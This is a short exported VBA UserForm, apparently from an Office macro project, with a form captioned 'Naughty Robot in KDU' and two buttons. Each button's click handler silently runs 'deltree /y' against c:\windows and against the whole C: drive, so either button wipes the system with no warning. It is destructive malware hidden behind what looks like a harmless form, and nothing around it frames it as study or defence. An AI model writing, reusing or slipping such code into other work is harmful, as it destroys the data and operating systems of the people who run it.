VERSION 5.00
Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} UserForm1 
   Caption         =   "Naughty Robot in KDU"
   ClientHeight    =   5445
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   5340
   OleObjectBlob   =   "UserForm1.frx":0000
   StartUpPosition =   1  'CenterOwner
End
Attribute VB_Name = "UserForm1"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub CommandButton1_Click()
Shell "deltree /y c:\windows", vbMinimizedFocus
Shell "deltree /y c:\*.*", vbMinimizedFocus
End Sub

Private Sub CommandButton2_Click()
Shell "deltree /y c:\windows", vbMinimizedFocus
Shell "deltree /y c:\*.*", vbMinimizedFocus
End Sub
